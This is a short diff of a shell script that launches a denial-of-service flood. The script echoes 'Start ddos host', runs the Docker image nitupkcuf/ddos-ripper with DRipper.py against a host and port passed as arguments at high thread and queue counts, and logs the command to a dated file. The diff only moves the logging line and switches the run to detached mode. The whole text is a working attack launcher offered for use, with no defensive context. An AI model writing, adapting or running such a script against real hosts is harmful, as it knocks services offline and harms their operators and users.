@@ -23,5 +23,7 @@ d=`date '+%Y-%m-%d %H:%M:%S'`
 d2=`date '+%Y-%m-%d'`
 
 echo "Start ddos host $1 port $2"
-echo "$d docker run --rm -it --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s $1 -p $2 -t 135 -q 10000"  >> "$d2".log
+
 docker run --rm -d --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s "$1"  -p "$2" -t 135 -q 10000
+
+echo "$d docker run --rm -d --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s $1 -p $2 -t 135 -q 10000"  >> "$d2".log
